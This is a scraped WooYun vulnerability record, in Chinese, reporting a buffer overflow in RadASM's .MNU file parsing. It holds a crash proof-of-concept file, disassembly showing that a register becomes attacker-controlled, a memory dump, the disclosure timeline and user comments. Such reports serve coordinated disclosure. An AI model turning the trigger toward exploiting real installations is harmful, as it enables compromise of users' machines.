{"id": 5192, "wybug_id": "wooyun-2013-047426", "wybug_title": "RADASM缓冲区溢出漏洞(第三弹）", "wybug_corp": "www.oby.ro", "wybug_author": "光刃", "wybug_date": "2013-12-30 16:50", "wybug_open_date": "2014-03-30 16:50", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "11", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-12-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-01-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-01-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-02-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-03-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-03-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-03-30：\t细节向公众公开  简要描述： 第一弹是处理.RC文件的缓冲区溢出漏洞第二弹是处理.DLG文件的缓冲区溢出漏洞第三弹是处理.MNU文件的缓冲区溢出漏洞原理：在处理.MNU文件时未对结构大小进行检测，造成缓冲区溢出。 详细说明：  原理：在处理.MNU文件时未对结构大小进行检测，造成缓冲区溢出。这里我随意构造触发程序崩溃的poc 把下面数据以文本形式保存，命名为poc.mnu（80H个1  4个2）\n1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111112222\n相应代码：004245CD   .  8DBD BCFEFFFF lea     edi, dword ptr [ebp-144]004245D3   .  8B4E 68       mov     ecx, dword ptr [esi+68]          ;  ecx被淹没 可控004245D6   .  0BC9          or      ecx, ecx004245D8   .  74 06         je      short 004245E0004245DA   .  B0 2E         mov     al, 2E004245DC   >  AA            stos    byte ptr es:[edi]004245DD   .  AA            stos    byte ptr es:[edi]004245DE   .^ E2 FC         loopd   short 004245DC0B8B0048  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  11111111111111110B8B0058  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 00  111111111111111.0B8B0068  31 31 31 31 31 31 64 00 31 31 31 31 31 31 31 31  111111d.111111110B8B0078  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  11111111111111110B8B0088  31 31 31 31 31 31 31 31 31 31 31 00 31 31 31 31  11111111111.11110B8B0098  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  11111111111111110B8B00A8  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  11111111111111110B8B00B8  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 31  11111111111111110B8B00C8  31 31 31 31 31 31 31 31 31 31 31 31 31 31 31 00  111111111111111.0B8B00D8  32 32 32 32 00 00 00 00 00 00 00 00 00 00 00 00  2222............004010B4  |> /8A0431        /mov     al, byte ptr [ecx+esi]004010B7  |. |880439        |mov     byte ptr [ecx+edi], al004010BA  |. |41            |inc     ecx004010BB  |. |0AC0          |or      al, al004010BD  |.^\\75 F5         \\jnz     short 004010B4   漏洞证明：  \n\n   修复方案：  检测大小   版权声明：转载请注明来源 光刃@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-01-04 10:56 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-12-30 17:01 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  收了神通吧    \n     2013-12-30 17:17 |    \t\t光刃 \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:24        | 萝卜白菜保平安)\t\t \n  @xsser 让你说的，我都不好意思再发了。~~~~(>_<)~~~~     \n     2013-12-30 17:22 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @光刃 :)    \n     2013-12-30 18:20 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  牛人啊    \n     2013-12-30 21:26 |    \t\t雷锋 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:2        | 承接:钻井，架工，木工，电工，水暖工，力...)\t\t \n  刘明    \n     2013-12-31 01:44 |    \t\tredrain有节操 \t\t\t( 普通白帽子  |\t\t\t        Rank:183 漏洞数:26        | ztz这下子有165了！>_<'/&\\)\t\t \n  洞主太凶了！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}